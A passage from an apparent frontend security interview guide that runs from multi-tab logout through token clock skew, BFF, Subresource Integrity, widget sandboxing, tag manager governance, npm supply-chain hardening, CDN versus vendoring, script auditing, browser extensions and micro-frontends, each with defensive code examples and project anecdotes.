  • storage event fallback: writing a value to localStorage fires a storage event in other same-origin tabs (not the tab that wrote it) — a decades-old, more broadly supported mechanism that predates BroadcastChannel and still works as a fallback.

What to synchronize

  • Logout: every tab should clear its in-memory token and redirect to a logged-out state immediately, not wait for its next API call to fail.
  • Token refresh: if each tab independently calls /refresh on its own schedule, you can trigger unnecessary refresh-token rotation races; coordinating so only one tab refreshes and broadcasts the new access token to siblings avoids this.
  • Account switch: if a user logs out and a different user logs in on the same browser, stale per-tab state from the previous user must be fully cleared, not merely overwritten.

Code Example

// Broadcasting logout to every other open tab of the same origin.
const authChannel = new BroadcastChannel("auth");

function logout() {
  accessToken = null;
  authChannel.postMessage({ type: "LOGOUT" });
  window.location.href = "/login";
}

authChannel.onmessage = (event) => {
  if (event.data.type === "LOGOUT") {
    accessToken = null;
    window.location.href = "/login"; // this tab logs out too, immediately
  }
  if (event.data.type === "TOKEN_REFRESHED") {
    accessToken = event.data.token; // avoid every tab independently re-refreshing
  }
};

// Fallback for environments without BroadcastChannel: a storage-event ping.
function logoutFallback() {
  localStorage.setItem("logout-ping", String(Date.now())); // triggers 'storage' in OTHER tabs
}
window.addEventListener("storage", (e) => {
  if (e.key === "logout-ping") { accessToken = null; window.location.href = "/login"; }
});

An agent who logged out at shift end left a second browser tab open from earlier in their session; the next agent, using that still-authenticated tab, unintentionally performed actions under the previous agent's identity. Adding a BroadcastChannel-based logout propagation meant that logging out in any tab immediately logged out every other open tab of the same origin, closing the gap without requiring any change to shift-handover process.

Interviewers use this to see whether you think about auth state as a genuinely multi-tab, multi-context problem rather than assuming "one tab, one session." The senior answer names both the mechanism (BroadcastChannel with a storage-event fallback for broader support) and the specific failure mode it prevents (a stale-but-still-valid tab surviving a logout elsewhere) — and flags the shared-computer scenario specifically, since that's where this gap has the highest real-world impact.

Q47. How should a frontend handle clock skew and token expiry edge cases without breaking user experience or security?

ROI: ★★★ Frequency: Low-Medium

Short Answer

A token's exp claim is checked against the server's clock at validation time, but the client's local clock (used for any client-side "is this about to expire, should I refresh preemptively" logic) can drift from real time — a client clock running fast might refresh too eagerly (harmless but wasteful), while one running slow might believe a token is still valid past its actual server-side expiry, causing a request to fail unexpectedly. Handle it by never trusting the client clock as the source of truth for security decisions (only the server's validation matters for actual access control) while still using it defensively client-side to trigger proactive refresh a safety margin before the token's stated expiry.

Detailed Answer

Where clock skew actually bites

  • Proactive refresh logic: if the client schedules "refresh 60 seconds before exp" using its own clock, a sufficiently skewed client clock can misjudge that window, either refreshing unnecessarily often or missing the window and hitting a live 401.
  • Multi-tab/device coordination: different devices with different clock drift can appear to have wildly different "time until expiry" for the same token.
  • Server-to-server or SSR token validation: if your SSR layer's clock is skewed relative to the token issuer's, valid tokens can be spuriously rejected as expired (or, worse, expired tokens spuriously accepted) — this is why JWT libraries typically support a small clockTolerance/leeway parameter.

The correct trust boundary

Never make an authorization decision based on the client's belief about expiry — that's advisory only, purely for UX (avoiding a visible failed request). The actual security check is always the server re-validating the token against its own clock on every request; the client refreshing "early" is an optimization, not a security control.

Practical handling

  • Build in a refresh safety margin (e.g. refresh at 80% of the token's lifetime, not at the exact expiry instant) so modest client-clock drift doesn't cause a visible failure.
  • Always implement a 401 retry-with-refresh fallback in your API client regardless of proactive refresh logic, so a missed proactive refresh (due to clock drift, a sleeping laptop, etc.) degrades gracefully into one extra round trip instead of a broken UI.
  • On the server/SSR validation side, apply a small, deliberate clock-tolerance leeway (seconds, not minutes) rather than none at all, to absorb realistic infrastructure clock drift without meaningfully weakening expiry enforcement.

Code Example

// Client-side: treat "time until expiry" as advisory, with a safety margin,
// and ALWAYS have a reactive fallback for when the proactive path misses.
function scheduleProactiveRefresh(exp, refresh) {
  const msUntilExpiry = exp * 1000 - Date.now(); // subject to local clock drift
  const margin = 0.2; // refresh at 80% of remaining lifetime, not the exact edge
  setTimeout(refresh, Math.max(msUntilExpiry * (1 - margin), 0));
}

// Reactive fallback -- the real safety net, independent of clock accuracy:
async function api(path, opts) {
  let res = await fetch(path, authHeaders(opts));
  if (res.status === 401) {           // server's own clock said "expired" -- authoritative
    await refreshToken();
    res = await fetch(path, authHeaders(opts));
  }
  return res;
}

// Server-side JWT validation with a small, deliberate leeway for real clock drift:
jwt.verify(token, PUBLIC_KEY, { clockTolerance: 5 }); // seconds, not minutes

Project Example

Users on a fleet of kiosk devices with unsynchronized clocks (no reliable NTP access on an isolated network) experienced sporadic "session expired" errors well before tokens should have actually expired, purely because client-side proactive-refresh logic trusted the local clock's notion of "time remaining." Adding a generous refresh margin plus the mandatory 401-triggered reactive refresh fallback masked the clock-drift problem from the user's perspective entirely, while the actual security boundary (server-side expiry validation) remained untouched and correctly strict.

Senior Engineer Perspective

This is a good "have you actually operated this in production" question — clock skew is invisible in a demo and shows up only at fleet scale or on devices with unreliable time sync. The senior answer draws a firm line between client-side clock usage (UX optimization only, never authoritative) and server-side validation (the actual security boundary, with a small deliberate tolerance for real-world drift), and always pairs proactive refresh with a reactive fallback so a clock-driven miss degrades gracefully instead of breaking the session.

Q48. What is the Backend-for-Frontend (BFF) pattern, and why are more teams moving auth entirely server-side?

ROI: ★★★★ Frequency: Medium

Short Answer

In the BFF pattern, the browser never sees the real access/refresh tokens at all — a server-side component (the "backend for frontend," often deployed alongside or as part of the app's own backend) completes the OAuth/OIDC flow, holds the tokens itself, and issues the browser only an opaque, httpOnly, SameSite session cookie scoped to that BFF. The SPA calls its own BFF, which attaches the real token to the downstream API call server-side. This eliminates the entire browser-side token-storage debate (localStorage vs cookie XSS/CSRF trade-offs) because there is no token in the browser to steal in the first place.

Detailed Answer

Why this sidesteps the localStorage-vs-cookie dilemma entirely

Every token-storage discussion earlier in this chapter assumes the browser must hold a credential that talks directly to the resource API. BFF removes that assumption: the browser's only credential is a session cookie to your own first-party BFF, which can be httpOnly/SameSite=Strict with no cross-site use case at all (since only your own frontend calls it) — the strongest possible cookie configuration, with none of the cross-site relaxations other architectures need.

What the BFF actually does

  • Completes the Authorization Code + PKCE exchange server-side (or even without PKCE, since the BFF is a confidential client that can hold a client secret, unlike the SPA itself).
  • Stores access/refresh tokens in server-side session storage (Redis, etc.), never sending them to the browser.
  • Proxies API calls: the SPA calls /bff/orders, the BFF attaches the real bearer token and calls the actual resource API, then returns the response.
  • Handles refresh transparently server-side — the browser never needs refresh logic at all.

Trade-offs to be honest about

  • Adds an extra network hop and a server-side component to operate/scale, where a pure SPA-to-API architecture had none.
  • The BFF itself becomes a security-critical component — a vulnerability there (e.g. an SSRF-style bug letting one user's request read another's proxied response) is now high-value.
  • Doesn't help if you still need some client-side JS to call third-party APIs directly with their own tokens (payment SDKs, some analytics) — those still face the original storage trade-offs, just for a narrower token.

Code Example

// Browser -> BFF: only ever a same-site, httpOnly session cookie. No token visible.
fetch("/bff/orders", { credentials: "include" }); // no Authorization header from the browser at all

// BFF (server-side) -> real API: attaches the actual token, held server-side only.
app.get("/bff/orders", requireBffSession, async (req, res) => {
  const { accessToken } = await sessionStore.get(req.session.id); // never sent to the browser
  const apiRes = await fetch("https://api.example.com/orders", {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  res.json(await apiRes.json());
});

// BFF's own cookie to the browser can be maximally strict --
// there's no cross-site use case for it at all:
Set-Cookie: bff_session=opaque123; HttpOnly; Secure; SameSite=Strict

Project Example

A fintech SPA had spent significant engineering effort tuning its localStorage-vs-cookie token strategy, rotation logic, and multi-tab sync, and still faced an unresolved residual XSS-to-token-theft risk that no amount of tuning fully eliminated. Migrating to a BFF architecture (introducing a thin Node proxy layer that held the OAuth relationship) removed the token entirely from the browser's reachable surface — a subsequent XSS finding during a pen-test could still act within the session, but had nothing durable to steal, since there was no token anywhere in browser-accessible storage.

Senior Engineer Perspective

The senior framing: BFF doesn't make XSS harmless (an attacker can still ride the session cookie to act as the user while it's live), but it eliminates the durable credential theft outcome that makes XSS catastrophic rather than merely bad, and it collapses the entire localStorage-vs-cookie-vs-in-memory debate into a solved, first-party-only cookie problem. Mention the added operational surface honestly — a BFF is a new component that must itself be secured and scaled — so it's a deliberate architectural trade, not a free upgrade.

Q49. What is Subresource Integrity (SRI), and what does it protect against that HTTPS alone does not?

ROI: ★★★★ Frequency: Medium

Short Answer

Subresource Integrity lets you attach a cryptographic hash (integrity="sha384-...") to a <script> or <link> tag; the browser computes the hash of whatever it actually downloads and refuses to execute/apply it if the hash doesn't match. HTTPS guarantees the bytes weren't tampered with in transit between the server and your browser — it says nothing about whether the file at the source (a CDN, a third-party host) was itself compromised, replaced, or serving a different version than you expect. SRI protects against exactly that: a trusted-but-compromised or altered origin serving different content than you audited.

Detailed Answer

The threat model SRI addresses

If you load a library from a public CDN and that CDN is compromised (or a caching layer serves stale/tampered content, or a shared multi-tenant CDN account is misused), HTTPS provides zero protection — the connection to the compromised server is still perfectly valid TLS. SRI closes this gap by binding your trust to the exact content you reviewed, not to "whoever currently controls this URL."

How the hash is generated and verified

You compute a SHA-256/384/512 hash of the exact file content at the time you vet it, embed it in the integrity attribute, and set crossorigin="anonymous" (required for cross-origin SRI to work, since the browser needs a CORS-permitted response to read the bytes for hashing). Any future change to that URL's content — a compromised update, a CDN serving a different build — fails the hash check and the browser blocks it entirely, rather than silently executing altered code.

Practical limits

  • SRI protects a specific version pinned by hash — if the vendor legitimately updates the file, your hash goes stale and the resource breaks (fails closed, which is the safe failure mode, but requires you to update the hash on every intentional upgrade).
  • It only covers resources you explicitly add it to — build tools (Vite, Webpack via plugins) can auto-generate SRI hashes for your own bundled output on top of a CDN, which is worth doing for self-hosted assets too, not just third-party CDN scripts.
  • It does nothing for content loaded dynamically via fetch/import() unless you verify the hash yourself in code — the browser's automatic SRI check is tag-attribute-based.

Code Example

// SRI on a third-party CDN script -- exact content is pinned by hash.
<script
  src="https://cdn.example.com/react-datepicker@4.2.1/dist/index.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"></script>

// If the CDN is compromised and serves DIFFERENT content at the same URL,
// the computed hash won't match and the browser refuses to execute it:
// "Failed to find a valid digest in the 'integrity' attribute..."

// Generating the hash for a file you've vetted:
// openssl dgst -sha384 -binary react-datepicker.js | openssl base64 -A

// Build tools can auto-generate SRI for your OWN self-hosted bundles too,
// defending against a compromised CDN/edge cache serving a tampered build.

Project Example

A company loaded a widely-used charting library from a public CDN without SRI. When that CDN suffered an account compromise and briefly served a modified file containing a cryptomining script to some visitors, sites using SRI on that exact resource were entirely unaffected (the browser rejected the tampered file), while the unprotected site had to scramble an emergency response and customer notification. Q50. How do you sandbox a third-party widget so a vendor compromise doesn't become your incident?

ROI: ★★★★ Frequency: Medium

Short Answer

The strongest containment is running the widget in a sandboxed iframe on a different origin from your app — this makes Same-Origin Policy do the isolating: the widget's script, even if fully compromised, cannot read your page's DOM, cookies, or JS state, and can only communicate with your app through an explicit postMessage channel you design and validate. Directly embedding a third-party <script> tag in your main document, by contrast, gives that script the exact same privileges as your own first-party code — a vendor compromise there is functionally indistinguishable from an XSS on your own origin.

Detailed Answer

The privilege gap between the two integration styles

Integration styleWidget's access if compromised
Direct <script> in main documentFull: your DOM, cookies, localStorage, JS state, other requests you make
Sandboxed, cross-origin iframeOnly what it explicitly gets via postMessage; no direct DOM/cookie access to your app

Designing the postMessage boundary defensively

Isolation is only as good as the message channel you build. Validate event.origin strictly against the widget's known origin before trusting any message, define a narrow, explicit set of message types the widget may send/receive, and never blindly render a message's content into your DOM without treating it as untrusted input (recall DOM-based XSS via postMessage covered earlier in this chapter).

When direct embedding is still the practical choice

Some widgets fundamentally need deep page integration (a design tool that must read/manipulate your actual DOM) and can't be sandboxed this way. For those, lean harder on the other controls: SRI, a tightly scoped CSP allow-list, and treating the vendor relationship with the scrutiny of an internal dependency — vet their security practices, monitor their changelog, and have a rollback plan.

Shadow DOM as a partial, weaker alternative

Shadow DOM gives style/DOM-structure encapsulation (useful for avoiding CSS collisions) but provides no security isolation — script inside a shadow root still runs with full main-document privileges. Don't reach for Shadow DOM when the actual goal is security containment; only a cross-origin frame provides that.

Code Example

// LOWER isolation: widget script runs with full page privileges.
<script src="https://widget-vendor.com/embed.js" data-key="abc"></script>
// A vendor compromise here = a compromise of YOUR page, cookies included.

// HIGHER isolation: sandboxed, cross-origin iframe with an explicit,
// validated message channel -- Same-Origin Policy does the containing.
<iframe
  src="https://widget-vendor.com/embed"
  sandbox="allow-scripts allow-forms"
  id="widget-frame"></iframe>

<script>
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget-vendor.com") return; // strict origin check
  if (event.data?.type !== "WIDGET_READY" && event.data?.type !== "WIDGET_EVENT") return;
  handleWidgetMessage(event.data); // still treat contents as untrusted data
});
document.getElementById("widget-frame").contentWindow.postMessage(
  { type: "INIT", theme: "dark" }, "https://widget-vendor.com" // explicit target origin, never "*"
);
</script>

Project Example

A marketplace embedded a live-chat widget directly via a main-document script tag for two years. When the vendor's build pipeline was later found to have briefly shipped a tampered file to a subset of customers, the marketplace's security team had to assume full compromise (cookies, DOM, any in-page tokens) for every user who loaded the page during that window, triggering a costly incident response. Migrating the widget to the vendor's sandboxed-iframe embed option, with a narrowly-typed postMessage API, meant a hypothetical repeat incident would be contained to "the widget's own iframe was compromised" rather than "our whole application was compromised."

Senior Engineer Perspective

The senior point to land clearly: sandboxing isn't primarily about distrust of a specific vendor today, it's about bounding the blast radius of a vendor compromise you can't predict or prevent. A strong candidate also flags that Shadow DOM is commonly and incorrectly cited as a security boundary in this context — it isn't one — and that the postMessage channel itself must be designed defensively (origin checks, narrow message vocabulary) or the sandboxing benefit is undermined by a sloppy bridge between the two contexts.

Q51. What specific risks do tag managers (like Google Tag Manager) introduce, and how do you govern them?

ROI: ★★★★ Frequency: Medium

Short Answer

A tag manager is, by design, a mechanism for injecting arbitrary third-party JavaScript into your page without a code deploy — usually managed by marketing/analytics teams outside engineering's normal review process. That convenience is exactly the risk: it's a standing, code-review-bypassing injection point into your production origin, and every tag added (analytics, ad pixels, heatmap tools, A/B test scripts) runs with full page privileges unless specifically constrained. A single careless or compromised tag is equivalent to an XSS on your site.

Detailed Answer

Why this bypasses normal engineering controls

Code review, CI checks, dependency scanning, and CSP nonce-wiring are all things engineering builds into its own deploy pipeline. A tag manager container is typically published by a separate team through the vendor's own console, often without any of those gates — a marketing team can add a new third-party pixel this afternoon that engineering never reviewed and that your CSP wasn't updated to account for.

Concrete failure modes

  • A newly added tag makes the page fail CSP (blocked silently, breaking a marketing campaign) or, worse, is added to an org's script-src 'unsafe-inline' exception specifically to "make tags work," undermining the whole policy.
  • A compromised or malicious third-party tag (a supply-chain attack against an ad-tech vendor) executes with full access to your page, including any tokens/cookies present.
  • Tags reading and exfiltrating form data (intentionally, for "conversion tracking," or maliciously) without engineering's awareness of what data actually leaves the page.

Governance that actually works

  • Require any new tag/container change to go through a lightweight review gate (even a checklist: what does this script access, where does its data go, is its origin already CSP-allow-listed) rather than a pure marketing self-service process.
  • Use the tag manager's own sandboxed/restricted execution mode where available (e.g. GTM's server-side tagging, which moves the actual data-collection logic to a server you control, sending far less directly through client-side script).
  • Keep CSP strict and require new tags to request a specific origin addition rather than defaulting to a permissive policy "so tags always work."
  • Periodically audit the live container for tags nobody remembers adding — these accumulate and rarely get removed.

Code Example

// A permissive CSP added specifically to unblock a tag manager -- undermines
// the whole policy, since the tag manager can now load literally anything:
Content-Security-Policy: script-src 'self' https://www.googletagmanager.com 'unsafe-inline'

// Better: allow the tag manager's loader script by nonce/origin, but require
// EACH downstream tag's own origin to be explicitly added as it's approved --
// resist the temptation to blanket-allow "anything GTM wants to load."
Content-Security-Policy:
  script-src 'self' 'nonce-r4nd0m' https://www.googletagmanager.com;
  connect-src 'self' https://www.google-analytics.com https://approved-vendor.example.com;

// Server-side tagging moves collection logic off the client entirely --
// the browser sends events to YOUR endpoint, which forwards server-to-server,
// drastically shrinking what runs as arbitrary third-party client JS.

Project Example

An e-commerce site's marketing team added a new "cart abandonment" remarketing tag through the tag manager console during a product launch, unaware it read and transmitted full cart contents (including applied discount codes) to a third-party ad network — a data-handling decision that had never been reviewed by engineering or legal. A lightweight review gate introduced afterward (any new tag change requires a one-paragraph data-flow description, reviewed by a rotating engineer) caught a similar issue before launch the following quarter, without materially slowing down the marketing team's usual cadence.

Senior Engineer Perspective

This question probes whether you think about security governance beyond your own pull requests. A senior engineer recognizes the tag manager as a parallel, less-controlled deployment pipeline into production and pushes for a lightweight but real review process rather than either blocking marketing's velocity entirely or ignoring the risk because "it's not our code." Mentioning server-side tagging as a way to shrink the client-side attack surface specifically (not just "add more review") shows deeper familiarity with the current tooling landscape.

Q52. Beyond npm audit, what practical steps reduce risk from install-time scripts and dependency confusion?

ROI: ★★★★ Frequency: Medium

Short Answer

npm audit only catches known, disclosed vulnerabilities — it does nothing against a brand-new malicious package, a compromised maintainer account pushing a fresh malicious version, or a postinstall script that exfiltrates CI secrets the moment npm install runs, all of which have zero CVE to detect. Practical additional controls: run installs with --ignore-scripts where feasible, scope your private package names against dependency confusion, use least-privilege CI tokens so a compromised install script has little to steal, and consider behavior-based scanning (not just CVE-matching) for new/updated dependencies.

Detailed Answer

Why install scripts are uniquely dangerous

preinstall/install/postinstall hooks run arbitrary Node code the moment a package is installed — before your application code ever executes, often in a CI environment that holds real secrets (deploy keys, npm publish tokens, cloud credentials). A malicious package doesn't need to be imported and run by your app at all; installing it is enough.

Dependency confusion, concretely

If your org has an internal package (e.g. @yourco/utils) resolved from a private registry, but your .npmrc/CI config doesn't strictly scope that resolution, a publicly-published package with the same name can be resolved instead under certain misconfigurations — handing an attacker a way to have their code installed inside your build simply by publishing a same-named public package.

A practical hardening checklist

  • npm install --ignore-scripts (or the equivalent config) for CI/build environments where you don't specifically need install-time compilation steps, re-enabling per-package via an explicit allowlist if truly needed (e.g. native binary builds).
  • Explicitly scope your .npmrc so your organization's package scope always resolves from your private registry, never falling back to the public registry for those names.
  • Use least-privilege, short-lived CI tokens — a compromised install script in a build with a narrowly-scoped, expiring token can do far less damage than one with a long-lived publish-everything credential.
  • Adopt a behavior-based scanner (Socket, Snyk's newer detection) that flags suspicious new package behavior (network calls at install time, obfuscated code) rather than relying solely on a CVE database that's always behind brand-new attacks.
  • Pin and review dependency updates deliberately rather than auto-merging every Dependabot PR without a glance at the diff, especially for install-script-bearing packages.

Code Example

# Disable install scripts by default in CI; opt back in per-package only when needed.
npm ci --ignore-scripts

# .npmrc: pin your org's scope to your private registry, no public fallback.
@yourco:registry=https://npm.yourco.internal/
always-auth=true

# Explicit, minimal-lifetime CI credential rather than a broad, long-lived one --
# limits what a compromised install script (if scripts ARE enabled for one
# specific native-module package) can actually reach.
NPM_TOKEN=$(vault read -field=token secret/ci/npm-readonly-1h)

# Behavior-based review step in CI for new/updated dependencies (conceptual):
socket-cli scan package-lock.json --fail-on=high

Project Example

A CI pipeline ran npm install with a long-lived, broad-scope deploy token available as an environment variable to every step, including dependency installation. A routine dependency bump pulled in a transitive package whose postinstall script (unrelated to its stated purpose) attempted to read environment variables and exfiltrate them — caught only because an outbound-network-monitoring rule flagged the unexpected connection during install, not by npm audit, which had nothing to report since the package had no known CVE. The team moved to --ignore-scripts by default in CI and split the broad deploy token into narrowly-scoped, short-lived credentials issued only to the specific steps that needed them.

Senior Engineer Perspective

The senior distinction to draw explicitly: npm audit is a known-vulnerability tool, and supply-chain attacks are increasingly zero-day-by-construction — a brand-new malicious package or a fresh malicious version of a trusted one has no history to match against. The durable mitigations are structural (disable install scripts by default, least-privilege CI credentials, scoped registry resolution) rather than detection-based, because they reduce the damage even from an attack pattern nobody has cataloged yet.

Q53. How should you evaluate whether to vendor a dependency's code versus loading it from a CDN?

ROI: ★★★ Frequency: Low-Medium

Short Answer

A public CDN gives you convenience and potential cross-site cache sharing, but hands control over exactly what code your users execute to a third party's infrastructure and update cadence — with SRI as the main mitigation. Vendoring (bundling the dependency into your own build/deploy) gives you full control over exactly which version ships, when, and lets your own CI/dependency-scanning pipeline see and vet it like any other code — at the cost of your own bundle size and update responsibility. Most security-conscious teams default to vendoring for anything security-sensitive, reserving CDN loading for cases with a specific caching/performance rationale and always paired with SRI.

Detailed Answer

What you give up with a public CDN

  • No visibility into when the served content might change unless you pin an exact versioned URL (never a "latest" alias) and add SRI.
  • The CDN provider becomes a dependency in your security posture — their compromise, misconfiguration, or an account takeover on their platform becomes your incident (see the SRI question above).
  • Your own dependency-scanning tooling (which typically inspects your package.json/lockfile) may have no visibility into a CDN-loaded script at all, creating a blind spot in vulnerability tracking.

What you give up by vendoring

  • You lose the (increasingly marginal, given HTTP/2+ per-origin connection reuse and cache partitioning changes) shared-cache benefit some once assumed for popular CDN-hosted libraries.
  • You take on responsibility for actually updating the dependency yourself, rather than a CDN "just working" with the latest patched version automatically (which is also itself a risk — auto-updating to an unreviewed new version has its own supply-chain exposure).

A reasonable default policy

Vendor (bundle via your normal package manager and build pipeline) anything that touches authentication, payments, or sensitive data handling, so it's fully visible to your own review and scanning tools. Reserve CDN loading for genuinely optional, non-sensitive, easily-sandboxed widgets, and never without SRI and a pinned exact version.

Code Example

// CDN loading -- fine for a non-sensitive widget, but ALWAYS pin an exact
// version (never "@latest") and always add SRI:
<script
  src="https://cdn.example.com/lib@2.4.1/dist/lib.min.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"></script>

// Vendored instead -- goes through your normal package manager, lockfile,
// npm audit, and CI dependency-scanning pipeline like any other code:
// package.json: "payment-sdk": "3.2.0"  (exact version, in your lockfile)
import { PaymentForm } from "payment-sdk"; // bundled into YOUR build output

// Rule of thumb: anything touching auth/payments/PII -> vendor it.
// A purely cosmetic widget with no data access -> CDN + SRI is acceptable.

Project Example

A team loaded their analytics library from a CDN with no version pin ("just always get the latest"), reasoning it meant automatic security patches. An unannounced major version bump on the CDN silently changed the library's data-collection behavior in a way that briefly violated the company's own privacy policy, discovered only when a compliance audit compared actual network traffic to documented behavior. Switching to a pinned, vendored version — updated deliberately through normal PR review whenever the team chose to upgrade — restored control without materially slowing down legitimate security patch adoption, since patches were still applied, just intentionally rather than silently.

Senior Engineer Perspective

The senior framing treats this as a risk/control trade-off, not a pure performance question: vendoring buys visibility and intentional control over what code ships, at the cost of taking on update responsibility yourself. A candidate who immediately reaches for "CDN is faster because of caching" without weighing the security-review-visibility angle is missing half the picture that a security-conscious team actually needs when making this call for sensitive functionality.

Q54. How would you audit a third-party script's actual runtime behavior before approving it for production?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Reading a vendor's marketing page or privacy policy tells you what they claim the script does; you need to independently verify what it actually does. Load the script in an isolated test environment, capture every outbound network request it makes (destinations, payload contents), inspect what DOM/storage/cookie access it performs, and diff that behavior against the vendor's stated purpose — flagging anything unexplained (unexpected third-party domains, reading unrelated form fields, broad storage access) before it ever reaches production traffic.

Detailed Answer

A concrete audit process

  1. Load the script in an isolated browser profile/test page with the browser's network panel recording, and interact with the page the way a real user would.
  2. Catalog every distinct outbound request domain — a "simple analytics pixel" that also calls three unrelated ad-tech domains is worth a conversation with the vendor or a rejection.
  3. Inspect what it reads: does it access form fields, localStorage/cookies beyond its own namespace, or clipboard content it has no obvious reason to need?
  4. Check what it injects: does it add its own DOM elements, override global objects/prototypes, or monkey-patch fetch/XMLHttpRequest (a red flag, since that lets it observe or alter every other request your page makes, not just its own)?
  5. Repeat the audit on version bumps, not just the initial approval — a vendor's behavior at approval time is not a permanent guarantee.

Automating parts of this

Some teams run a headless-browser-based CI check that loads a staging page with the vendor script and asserts against an allow-list of expected network destinations, failing the build if a new, unapproved domain appears — turning "audit once, hope nothing changes" into a continuously enforced check.

What to do with the findings

Feed unexplained behavior directly into your CSP connect-src decision (only allow-list domains you've actually verified are legitimate and necessary) and into your vendor-risk conversation — a vendor unwilling to explain an unexpected data flow is a strong signal to reconsider the integration entirely, independent of any specific technical fix.

Code Example

// A CI check (headless browser) asserting a vendor script only talks to
// its expected, approved domains -- fails the build on any new destination.
const ALLOWED_DOMAINS = new Set(["analytics-vendor.example.com"]);

test("vendor script makes only approved network calls", async () => {
  const page = await browser.newPage();
  const seenDomains = new Set();
  page.on("request", (req) => seenDomains.add(new URL(req.url()).hostname));

  await page.goto("https://staging.example.com/page-with-widget");
  await page.waitForTimeout(3000); // let async/deferred calls fire

  const unexpected = [...seenDomains].filter(d => !ALLOWED_DOMAINS.has(d) && d !== "staging.example.com");
  expect(unexpected).toEqual([]); // any new/unapproved domain fails the build
});

// Also worth checking explicitly: did the script monkey-patch a global?
test("vendor script does not override fetch", async () => {
  const originalFetch = window.fetch;
  await loadVendorScript();
  expect(window.fetch).toBe(originalFetch); // unchanged reference = no interception
});

Project Example

Before approving a new "session replay" analytics vendor, a security review loaded the script in an isolated test page and found it silently patched XMLHttpRequest.prototype.open to observe every request the app made, including ones to internal, unrelated APIs — far beyond what the vendor's public documentation described. The finding was escalated to the vendor, who confirmed it was intentional (to correlate replay sessions with API errors) but hadn't disclosed the mechanism; the team required a scoped, documented API from the vendor before approval rather than accepting an undisclosed global monkey-patch into production.

Senior Engineer Perspective

This question filters for practitioners who treat "we added a script tag" with the same scrutiny as "we added a new backend dependency with database access" — because functionally, a third-party script with full page privileges often has comparable reach. The senior answer emphasizes verifying actual behavior over trusting vendor documentation, flags global monkey-patching (intercepting fetch/XHR) as a particularly high-risk pattern worth specifically checking for, and treats the audit as recurring (on every version bump), not a one-time gate.

Q55. Can a malicious or compromised browser extension bypass your app's security controls, and what can a frontend team actually do about it?

ROI: ★★★ Frequency: Low

Short Answer

Yes — a browser extension with broad permissions runs with far more privilege than any page it visits, and can read/modify the DOM, intercept form submissions, read cookies/storage, and inject its own scripts into your page, largely independent of your CSP (extensions typically execute in a context that isn't fully bound by the page's own Content-Security-Policy). This is outside your application's direct control, but you're not powerless: you can detect obvious tampering, minimize what's exposed for an extension to grab, and treat this as an accepted residual risk in your threat model rather than a gap to "fix" at the app layer.

Detailed Answer

Why extensions are largely outside your CSP's reach

Extensions commonly inject content scripts that run in an "isolated world" sharing the page's DOM but with separate JS execution, and many extension capabilities aren't constrained by the hosting page's CSP at all, depending on the browser and extension's permission model. This means a user with a malicious or compromised extension installed has a threat sitting between them and every website they visit, not just yours.

What this means practically

  • A user's own extension can, in principle, exfiltrate anything visible on the page they're looking at, including form fields, tokens rendered into the DOM, or clipboard content — this is a user-device-level compromise, not an application vulnerability in the traditional sense.
  • It's also a common source of CSP violation-report noise (as covered earlier), since many benign extensions inject their own scripts/styles that trip a strict policy.

What a frontend team can reasonably do

  • Minimize sensitive data rendered into the visible DOM at all (the less there is to scrape, the less an extension-level compromise can grab).
  • For genuinely high-sensitivity flows (payment entry, credential entry), consider isolating the input into a same-origin-only iframe from a payment provider designed for exactly this threat model (many payment SDKs already do this specifically to reduce what any page-level compromise, extension or otherwise, can observe).
  • Accept and document this as a residual risk in your threat model — it's largely a user-device security posture issue, not something your app's code can fully close off, and treating it as an "our app is broken" bug wastes effort that's better spent on risks within your actual control.

Code Example

// You generally CANNOT block extension content scripts via CSP the same
// way you'd block a third-party page script -- extension execution
// contexts are often outside the page's CSP enforcement scope.

// What you CAN do: minimize sensitive data's presence in the visible DOM,
// reducing what any page-level observer (extension or otherwise) can scrape.
// Instead of rendering a full card number into a visible input's value:
<input value="4111 1111 1111 1111"> // fully scrapable by anything with DOM access

// Isolate truly sensitive entry into a provider-hosted iframe designed for
// exactly this threat model (illustrative -- use a real payment SDK's own
// hosted-fields pattern rather than hand-rolling this):
<iframe src="https://payments.provider.com/hosted-card-field" sandbox="allow-scripts allow-forms"></iframe>
// The provider's own origin renders and captures the sensitive input;
// your page (and anything with access to your page) never sees the raw value.

Project Example

Users reported unexplained account changes traced not to a bug in the app but to a popular browser extension (a "coupon finder") that had been quietly compromised in a supply-chain incident and was scraping form data and session tokens from any page its broad permissions covered, this app included. The team couldn't fix the extension, but the incident prompted moving the payment-entry flow to a provider-hosted iframe field (already planned for PCI-scope reduction reasons) which meant the compromised extension, while still able to see the surrounding page, could no longer directly capture raw card data being typed.

Senior Engineer Perspective

This question tests whether a candidate can correctly scope a threat as outside their control without either panicking or dismissing it. The senior answer names the mechanism precisely (extensions often execute outside the page's CSP enforcement, with broad DOM/storage access), accepts it honestly as a residual risk in the threat model, and redirects effort toward the concrete mitigation that's actually within the frontend team's control — minimizing sensitive data's exposure in the DOM and isolating the highest-value targets (payment/credential fields) into provider-hosted contexts built for exactly this class of threat.

Q56. What security considerations does module federation / micro-frontend architecture add to a supply-chain threat model?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Module federation (and micro-frontend architectures generally) let independently-deployed teams' JavaScript bundles combine into one running application at runtime — which means each contributing team's build pipeline, dependency tree, and deploy process becomes a supply-chain input to every other team's micro-frontend, all sharing the same page-level privileges (DOM, cookies, storage) once composed. A compromise or bug in one team's remote module can affect the entire composed application, not just that team's own section — the isolation you'd get from separate deployments doesn't extend to separate runtime security boundaries once everything is stitched together in one page.

Detailed Answer

Why this widens the trust boundary

In a traditional monolith, one team's PR goes through one shared review/CI/dependency-scanning pipeline before reaching production. In a federated architecture, team B's remote bundle is fetched and executed by team A's shell application at runtime, often deployed independently and on its own release cadence — team A's users are now trusting team B's entire supply chain (their dependencies, their build pipeline, their deploy process) without necessarily reviewing any of it, and vice versa for every other federated team.

Concrete risks introduced

  • A compromised or buggy dependency in one micro-frontend's build can run with full page privileges once composed into the shell, identical in impact to any other page-level XSS.
  • Remote module URLs, if not integrity-checked, are themselves a supply-chain injection point — anyone who can influence what a "remote entry" URL resolves to (a compromised CDN, a DNS issue, a misconfigured environment pointing at a non-production remote) controls code running in the composed app.
